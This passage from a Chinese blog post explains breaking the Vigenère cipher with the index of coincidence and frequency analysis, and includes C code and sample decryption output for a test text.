                <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/9aa12a27559142ed5a4bd388e9bc11a4909d8fbb" alt title class>
                <p></p>
            </figure>

<p>其中，观察概率为</p>
<figure class="image-box">
                <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/63c33432649ee77f4cb1bbbbaefb67cf0ebdb0df" alt title class>
                <p></p>
            </figure>

<p>其中，<em>c</em>是指字母表的长度（英文为26），<em>N</em>指文本的长度，<em>n</em>1到<em>nc</em>是指密文的字母频率，为整数。</p>
<p>此方法只是一种估计，会随着文本长度的增加而更为精确。在实践中，会尝试接近此估计的多个密钥长度。 一种更好的方法是将密文写成矩阵形式，其中列数与假定的密钥长度一致，将每一列的重合指数单独计算，并求得平均重合指数。对于所有可能的密钥长度，平均重合指数最高的最有可能是真正的密钥长度。这样的试验可以作为卡西斯基试验的补充。</p>
</blockquote>
<p>根据第二个公式来实现重合指数的计算</p>
<h2 id="重合指数确定key长度"><a href="#重合指数确定key长度" class="headerlink" title="重合指数确定key长度"></a>重合指数确定key长度</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这个数组用来存储密文字符出现的次数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> N[<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">得到密文不带空格的版本</span></span><br><span class="line"><span class="comment">inp: 密文字符串</span></span><br><span class="line"><span class="comment">buf: 存放不带空格版本的密文的buffer</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getNoAlpha</span><span class="params">(<span class="keyword">char</span> *inp, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (inp[i] == <span class="string">' '</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		buf[j++] = inp[i];</span><br><span class="line">	&#125; while (inp[i++] != '\x00');</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">维吉尼亚是根据key中字符在子母集中的位置来选择对应的表进行凯撒加密的</span></span><br><span class="line"><span class="comment">所以我们需要将使用相同key的字符所加密，即使用相同的密码表进行凯撒加密的密文字符当作一串密文</span></span><br><span class="line"><span class="comment">然后计算这串密文的重合指数，所以for循环要这样写</span></span><br><span class="line"><span class="comment">inp: 密文字符串</span></span><br><span class="line"><span class="comment">l: 开始偏移</span></span><br><span class="line"><span class="comment">n: key的长度</span></span><br><span class="line"><span class="comment">return: 字符串长度</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calcN</span><span class="params">(<span class="keyword">char</span> *inp, <span class="keyword">int</span> l, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Xlength; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		N[i] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> Ilength = <span class="built_in">strlen</span>(inp);</span><br><span class="line">	<span class="keyword">char</span> *buff = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(Ilength);</span><br><span class="line">	getNoAlpha(inp, buff);</span><br><span class="line">	Ilength = <span class="built_in">strlen</span>(buff);</span><br><span class="line">	<span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &lt; Ilength; i+=n, len++)</span><br><span class="line">	&#123;</span><br><span class="line">		N[indexOf(x, buff[i])]++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(buff);</span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这就是计算重合指数的关键函数，返回值越接近0.067，就代表</span></span><br><span class="line"><span class="comment">inp: 密文字符串</span></span><br><span class="line"><span class="comment">l: key长度</span></span><br><span class="line"><span class="comment">return: 重合指数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">IC</span><span class="params">(<span class="keyword">char</span> *inp, <span class="keyword">int</span> l)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">double</span> ICNUM = <span class="number">0.0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; l; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> len = calcN(inp, i, l);</span><br><span class="line">		<span class="keyword">double</span> sum = <span class="number">0.0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; Xlength; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum = sum + N[j] * (N[j] - <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		ICNUM += sum / (len*(len - <span class="number">1</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ICNUM / l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//假设key的最大长度</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_KEY_LENGTH 100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">用来生成假设的不同key的长度所计算出的重合指数，并根据谁最接近0.067进行排序</span></span><br><span class="line"><span class="comment">str: 密文字符串</span></span><br><span class="line"><span class="comment">ICS: 存放字符串的重合指数</span></span><br><span class="line"><span class="comment">ICSIdx: 存放ICS存的重合指数对应的key的长度</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">genICS</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">double</span> *ICS, <span class="keyword">char</span>*ICSIdx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; MAX_KEY_LENGTH; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">double</span> ic = IC(str, i);</span><br><span class="line">		<span class="keyword">if</span> (ic &gt; <span class="number">0.06</span> &amp;&amp; ic &lt; <span class="number">0.07</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			ICSIdx[pos] = i;</span><br><span class="line">			ICS[pos++] = ic;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pos - <span class="number">1</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; pos - <span class="number">1</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">double</span> t1 = ICS[j];</span><br><span class="line">			<span class="keyword">double</span> t2 = ICS[j + <span class="number">1</span>];</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">fabs</span>(t1 - <span class="number">0.067</span>) &gt; <span class="built_in">fabs</span>(t2 - <span class="number">0.067</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				ICS[j] = t2;</span><br><span class="line">				ICS[j + <span class="number">1</span>] = t1;</span><br><span class="line">				<span class="keyword">char</span> t1 = ICSIdx[j];</span><br><span class="line">				ICSIdx[j] = ICSIdx[j + <span class="number">1</span>];</span><br><span class="line">				ICSIdx[j + <span class="number">1</span>] = t1;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="频度分析确定key"><a href="#频度分析确定key" class="headerlink" title="频度分析确定key"></a>频度分析确定key</h2><p>上述步骤可以得到key的可能的长度，我保存了所有位于区间<code>(0.06, 0.07)</code>的重合指数以及它所对应的key的长度</p>
<p>接下来就要分别根据这些key的长度来求key的内容</p>
<p>首先，如果key只有一个字符，那么维吉尼亚加密就变成了凯撒加密</p>
<p>如果key有两个字符，可以把明文分称两部分，两个两个一组，一部分全部取左边，一部分全部取右边，然后对这两部分进行不同字母表的凯撒加密：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">假设key:ab</span><br><span class="line">假设明文:this is easy</span><br><span class="line">对应关系:abab ab abab</span><br><span class="line">组a:tiies	字母表:abcdefghijklmnopqrstuvwxyz</span><br><span class="line">组b:hssay	字母表:bcdefghijklmnopqrstuvwxyza</span><br><span class="line">加密结果a:tiies</span><br><span class="line">加密结果b:ittbz</span><br><span class="line">加密结果:tiit it ebsz</span><br></pre></td></tr></table></figure>

<p>因此可以分别对组a和组b，假设他们所对应的key的字符，进行解密，解密结果进行频度分析</p>
<p><a href="https://wenku.baidu.com/view/cb1c1a406edb6f1aff001f85.html" target="_blank" rel="noopener">字母表频率</a></p>
<p>正常的文本中，字母出现的频率是符合上表的。</p>
<p>字符是哪种情况与频度表所计算出的内积最大，则这一位的key就最有可能是什么</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">得到key的某一位所加密过的全部字符所组成的字符串</span></span><br><span class="line"><span class="comment">str: 密文字符串</span></span><br><span class="line"><span class="comment">buf: key的某一位所加密过的全部字符所组成的字符串</span></span><br><span class="line"><span class="comment">l: 开始偏移</span></span><br><span class="line"><span class="comment">n: key的长度</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">genStr</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">char</span> *buf, <span class="keyword">int</span> l, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> Ilength = <span class="built_in">strlen</span>(str);</span><br><span class="line">	<span class="keyword">char</span> *unAlpha = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(Ilength);</span><br><span class="line">	getNoAlpha(str, unAlpha);</span><br><span class="line">	Ilength = <span class="built_in">strlen</span>(unAlpha);</span><br><span class="line">	<span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &lt; Ilength; i += n)</span><br><span class="line">	&#123;</span><br><span class="line">		buf[pos++] = unAlpha[i];</span><br><span class="line">	&#125;</span><br><span class="line">	buf[pos] = '\x00';</span><br><span class="line">	<span class="built_in">free</span>(unAlpha);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">频度表，从头到尾分别对应a,b,......,z</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">double</span> g[] = &#123; <span class="number">0.08167</span>, <span class="number">0.01492</span>, <span class="number">0.02782</span>, <span class="number">0.04253</span>, <span class="number">0.12702</span>, <span class="number">0.02228</span>, <span class="number">0.02015</span>, <span class="number">0.06094</span>, <span class="number">0.06966</span>, <span class="number">0.00153</span>, <span class="number">0.00772</span>, <span class="number">0.04025</span>,<span class="number">0.02406</span>, <span class="number">0.06749</span>, <span class="number">0.07507</span>, <span class="number">0.01929</span>, <span class="number">0.00095</span>, <span class="number">0.05987</span>, <span class="number">0.06327</span>, <span class="number">0.09056</span>, <span class="number">0.02758</span>, <span class="number">0.00978</span>, <span class="number">0.02360</span>, <span class="number">0.00150</span>,<span class="number">0.01974</span>, <span class="number">0.00074</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">对上一个函数所得到的字符串用假定的key的字符所对应的字母表表进行解密</span></span><br><span class="line"><span class="comment">buf: 上一个函数得到的buf</span></span><br><span class="line"><span class="comment">o: 加密时字母表的偏移</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">genBuf</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> o)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	while (buf[i] != '\x00')</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> idx = indexOf(x, buf[i]);</span><br><span class="line">		idx -= o;</span><br><span class="line">		idx = idx &lt; <span class="number">0</span> ? idx + Xlength : idx;</span><br><span class="line">		buf[i++] = x[idx];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">上一个calcN函数的重载</span></span><br><span class="line"><span class="comment">buf: 上上个函数的结果</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calcN</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Xlength; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		N[i] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> Ilength = <span class="built_in">strlen</span>(buf);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Ilength; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		N[indexOf(x, buf[i])]++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">频度分析的关键函数，计算内积</span></span><br><span class="line"><span class="comment">buf: genStr所得到的buf</span></span><br><span class="line"><span class="comment">o: 加密时字母表的偏移</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">getqp</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> o)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *bufCopy = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(<span class="built_in">strlen</span>(buf)+<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(bufCopy, buf);</span><br><span class="line">	genBuf(bufCopy, o);</span><br><span class="line">	<span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> Blength = <span class="built_in">strlen</span>(bufCopy);</span><br><span class="line">	calcN(bufCopy);</span><br><span class="line">	while (bufCopy[i] != '\x00')</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> idx = indexOf(x, bufCopy[i]);</span><br><span class="line">		sum += ((<span class="keyword">double</span>)N[idx]/Blength) * g[idx];</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(bufCopy);</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">根据计算出的最大内积来生成key值</span></span><br><span class="line"><span class="comment">str: 密文字符串</span></span><br><span class="line"><span class="comment">KL: key的长度</span></span><br><span class="line"><span class="comment">preKey: 求出的可能的key</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">genKey</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">int</span> KL, <span class="keyword">char</span>* preKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> Ilength = <span class="built_in">strlen</span>(str);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; KL; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> *buf = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(Ilength, <span class="number">1</span>);</span><br><span class="line">		genStr(str, buf, i, KL);</span><br><span class="line">		<span class="keyword">double</span> *avg = (<span class="keyword">double</span>*)<span class="built_in">calloc</span>(KL, <span class="number">8</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; Xlength; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">double</span> s = getqp(buf, j);</span><br><span class="line">			<span class="keyword">if</span> (avg[i] &lt; s)</span><br><span class="line">			&#123;</span><br><span class="line">				avg[i] = s;</span><br><span class="line">				preKey[i] = x[j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">free</span>(avg);</span><br><span class="line">		<span class="built_in">free</span>(buf);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	generateBox();</span><br><span class="line">	<span class="keyword">char</span> str[] = <span class="string">"this is easy there is a river in front of me aunt cow said it was not deep but the little squirrel said it was deep what shall i do the old horse says my child you should try to cross the river by yourself if you donot try how do you know the river is deep or not the little horse carries the wheat and returns to the riverside at last he succeeds incrossing the river now he knows how deep the river is bosses used to use labour monitoring technologies to control over how workers do their jobs in februday amazon received patents for a wristband and it intended to force labourers to do their jobs with maximum efficiency it is a good option for firms seeking to maximise productivity  but to labours it may not technology creates new opportunities for oversight but text book economics suggests that in a competitive labour market any attempt to coerce people into working harder than they want will fail"</span>;</span><br><span class="line">	<span class="keyword">char</span> key[] = <span class="string">"thisisatest"</span>;</span><br><span class="line">	Vencrypt(str, key);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Encrypted: %s\n"</span>, str);</span><br><span class="line">	<span class="keyword">double</span> *ICS = (<span class="keyword">double</span>*)<span class="built_in">calloc</span>(MAX_KEY_LENGTH, <span class="number">8</span>);</span><br><span class="line">	<span class="keyword">char</span> *ICSIdx = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(MAX_KEY_LENGTH, <span class="number">1</span>);</span><br><span class="line">	genICS(str, ICS, ICSIdx);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------------\n"</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAX_KEY_LENGTH; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (ICSIdx[i] != <span class="number">0</span> || ICS[i] != <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d  %f\n"</span>, ICSIdx[i], ICS[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------------\n\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (ICSIdx[i] != <span class="number">0</span> || ICS[i] != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> KL = ICSIdx[i];</span><br><span class="line">		<span class="keyword">char</span> *preKey = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(KL + <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">		genKey(str, KL, preKey);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Key: %s\n\n"</span>, preKey);</span><br><span class="line">		<span class="keyword">char</span> *strCopy = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(<span class="built_in">strlen</span>(str) + <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">		<span class="built_in">strcpy</span>(strCopy, str);</span><br><span class="line">		Vdecrypt(strCopy, preKey);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Decrypt: %s\n"</span>, strCopy);</span><br><span class="line">		<span class="built_in">free</span>(strCopy);</span><br><span class="line">		<span class="built_in">free</span>(preKey);</span><br><span class="line">		i++;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"-----------------------\n\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(ICS);</span><br><span class="line">	<span class="built_in">free</span>(ICSIdx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行出现多个结果，但是同样也出现了正确的key</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Encrypted: moqk qk etwq malzw qk a kmnxk pv xzgnm sx fx hcfb uop wsbw pb oik nhx vxxw jmb lhx pammsm kymikvwe lhqv ql wtw vxxw ezil saede b kw lpw oeh zhkzm kiqs fc uabsl qwm sasmew azq bg ckskl mom jqnek fq rhbzkmdf bj qhn kwfwl tkc zhp kw qwm kgso mal zadwr bw vxxw wj vgt mlw ebabdm zokww vtyzamk tai oaxhb svv rxxmkgz bg bze kmnxkzqvm st eekm al amkuexhk bgjzgakigk lax yqnmj nha zx duwoa zop hwxi apw zavxv al uvakmk uliv mh baw tsbhyj fhuqlwjigk lxvovgtggbik mh jwfbjoe snxk owo egrdijl wv bzmar cstl bu nwjjuweq tfhhgv jeviaoxk xsbwnmw xhk h ejqktuefw tul ab anmifwxk bg ngrvi dtuvcjmjs ms vh momaz bouw obmo usfamnq wyypkamfcr ml bl h ogwv oixahg mwj narfw kxxrqfo lo fepbfpaw xjowyumbcqlg  tum xg etiwmzk im qsr gvb lmuhgsdhzf kjmstxw fxp vxhwjtnrambla xwj ooijlbnpl jmt mipm uvwc muogsebvz amoyelxk mahb av s chqhxmpbadw ltfgnk tijswt trq tmamexl th ggxkjm hmgpei agmv egzcigk ztkkmj bzag xzxr difb oiep xtbs</span><br><span class="line">-----------------------</span><br><span class="line">11  0.066778</span><br><span class="line">22  0.066718</span><br><span class="line">33  0.067964</span><br><span class="line">55  0.065468</span><br><span class="line">44  0.064895</span><br><span class="line">77  0.063709</span><br><span class="line">99  0.062650</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">Key: thisisatest</span><br><span class="line"></span><br><span class="line">Decrypt: this is easy there is a river in front of me aunt cow said it was not deep but the little squirrel said it was deep what shall i do the old horse says my child you should try to cross the river by yourself if you donot try how do you know the river is deep or not the little horse carries the wheat and returns to the riverside at last he succeeds incrossing the river now he knows how deep the river is bosses used to use labour monitoring technologies to control over how workers do their jobs in februday amazon received patents for a wristband and it intended to force labourers to do their jobs with maximum efficiency it is a good option for firms seeking to maximise productivity  but to labours it may not technology creates new opportunities for oversight but text book economics suggests that in a competitive labour market any attempt to coerce people into working harder than they want will fail</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">Key: thisisatewttdifiskgest</span><br><span class="line"></span><br><span class="line">Decrypt: this is easu thirr is q eiver in front ob me euat cej said it was not zeet bht txr little squirral seiq it mns deep what shahl i ho ghe eyd horse says my yhipd lou iuould try to croos tle eivue by yourself if uou hoaot jey how do you knos thi rvveh vs deep or not tha lixtye heese carries the sheet nnd hrturns to the rirerwiqe aj yast he succeedo ingrbssyag the river now de krojs hej deep the river es bssfes kfed to use laboun morigoryag technologieo to goatrey over how workens ds tueih wobs in februdau amezbn rupeived patents bor e weisjoand and it intejdeh tb fohpe labourers to zo tlevr jeos with maximum affmcvensl it is a good opteon joe fihzs seeking to matimmsr prequctivity  but tk lafohrs yg may not technohogc ceeajrs new opportunetiis sor eiersight but tett bsox eceaomics suggesto thet vn a sbmpetitive labkur qaekej nny attempt to ckerge ceofye into working darhee thqa they want will baip</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">..........</span><br></pre></td></tr></table></figure>

<p>但是有时会得不到正确结果，只能得到部分正确的key，这也就是利用统计分析的局限性了</p>
<p>比如这种情况：<code>char key[] = &quot;abcdefghijklmnopqrstuvwxyz&quot;;</code></p>
<p>会求出错误的key</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Encrypted: tikv mx khah dsqes xi r jbpzn fl erppw sk sl idxe obk hqzv bn rwp lnt eght gaa bqo wughau jincmnbj rajf lx bgz lnoa iuoi iysef d zl rge png ltxzm bkje zm rxzdw sjq pfnumf wvd zv kayde gvt hznxl wu vmtrtgoj nl fwd nzzbh ihp zhq yk vmt koqz xmk yqeoc uf rtug gk hjp qfd ljvwpj nvzbo nmefxuj lay rdbys aof uiyayvb dz fus gymwkmdzb ys lbuw lj ybkloppf wcsiglmdjd rge skyiw tve qo vzbkh xfo wyzl qfd rjxhv ny iwbcpe hgtt kg nmz hxznus orrnzvzrxr frqwdfdhadap rn cppwvtr vdnb saj kdhbwkm yk qfdis lrfx ou nnlcgqon qdssii nbadiwgg tfzlvcc qae o lhzkmvvja ymd jv lrykulnn ea scgsv dtvjqocqs uq gs ynlqa tznf kxjy etrdirk dfgkfmjtjg rd te n udeu gindkk dnr gkuqx ylmtsys gc bqoafcna mpndvewmaoag  kee fb zprfmkm dp jyx npv wihnuwuyrk pftqkwl hzs lnoosvxrnzpmb pzd bjthjazbo xrr seyv estq lkxxzyvqh ilyzynpp rgau kq e hutxndtfvjt brthom ixpjeu cqc fzamvze fb qduiux jzkmjd iovr atxrqwq smerth kzth odbw vaov zmqr mirv</span><br><span class="line">-----------------------</span><br><span class="line">26  0.065404</span><br><span class="line">78  0.062892</span><br><span class="line">52  0.061496</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">Key: abrsefghijklmxgpdrstuzwxyz</span><br><span class="line"></span><br><span class="line">Decrypt: thtd is easy thehm if a rivar in froye of me aunt cee snid it sas not dppp but the lijblr squinrel saio tt was deep wxit fhall e do the owo horse says cg cuild yku shoulo ery to cross jpe eiver xy yourspwf if you doneb tey how zo you knzh the river ii lerp or nkt the lieele horse cahzirs the sheat ano ceturns to txm rvversede at lade he succeedi qnprosseng the rtger now he knees uow deap the rigpr is bosses kaeq to usa labour xznitoring tukhaologees to coyerol over hom eoekers zo their uzbs in februtiy nmazoj receivpo patents foh i weistbwnd and ie tntended to vwrpe labkurers tz oo their jobi eigh maxemum efftniency it is q oobd opteon for ftcms seeking jw mnximioe produneivity  but te taoours et may noe eechnology szentes naw opporefnities for edeesighp but texe mook economyks fuggeots that ty a competityde yaboun market lyy attempt te korrce paople inez working hahlee than phey wane hill fail</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">Key: avrnefkhsjzvmqopeksgizvxyzwlcsefghenkpbbmpmvcdzzflnjafrsrfvrijkamncpqfwtyvgifz</span><br><span class="line"></span><br><span class="line">Decrypt: tnti is aaiy exeoe ie h rvhas in fvene of me eqnp nay seet yo sre yet zppc bfj the witfle emuerhte saoo yt wws tepf weat eoayx e eo thi elo horsi oaud ya clebt tkl eseuho eey ee crods tte ruren bo nhurypbf ib yeu oenlt tdf hbi zp you odoh the rmren te feil eh ikk fsu leeeye serse nardiee pha wxttt ato hetqrds ee tee ruceeeeee at pqse he sugyeaoe kngneinees exe ntgrr yew he vnois has daef iae rogur io besdus rsep ao hea maboyh mznitovenc eqehrkbebeve ee ckyeeow ever sow iorwaro de iaeix uebs en vemhuaay mtamaj secemleo paterps bzd c wveijwwep ldd ee tatpdded eo farcq haxokgxrs zz to tdeyr uebp wifo mnjenum ejviniencc et ed m iosz efoefz qer btczs duekiyg ta majemesu ekodanjiveto  bfj tl lanvuee eu may ret eechnshocj oteepui ian aafonefaieyes fzr ohereegdt rjm tede roog esoyemfcs ebgtqous thej iy a comtateeuxe pwrepn dmcaep lyl aejempe to ooedye leeeee itee wonkynr xaoded ahnz piey wedt hill feel</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">Key: abcsifuhixklwndtqvstyvgifzwordeugrcjkabxgpdbzguzlxyz</span><br><span class="line"></span><br><span class="line">Decrypt: thid es qask thurp es w rireh xg fvbyt oq mu gune nee snyw vt sls not depl bgt tte lytehe oquerhte sevo it hai jeea hxit fxtyl e oo the olo dodse eayi mj yheld uok haoyyo trj te irodd jpe eyorr xj yoursewb ir yog dodoe pru hos de nhu oazw tse hovec ti lerf he nke the litehe toree cqrceeo tha wxttt eao reeuhts tz exm rvlxeseoe at lase de eucoeets tjcnosoidv mhi etvec nec he vyees uep qeaa the rivpn ie boesei udad po uoe bpuoye xonttexinr eukhaeebgeps to conenox ovqr hew hkrgero de iaeme uobd id lebcftiy nctmoj ceceiveo lafenfs fer l srestxads tnh ve ineedjed ez vwrpu enbkfrers to ok tteid jors hetd maticjf ejstcipnse it td q oobt hctezn for ficis eeewinw tz iatimesu ekohhntigije  bue ee taoenes ee may not eactnoxogo ccaapes jem dipseeunttyks fzc edeeibthp mut text mkow ecanocino sqggasjh mheg tn a nocvetteyde yqubun xarket ayu afteypt jo nkence leeeee maeo wzraong slhlee jann psey want helx faul</span><br><span class="line">-----------------------</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>红帽杯线下pwn1遇到IO_File新利用方法</title>
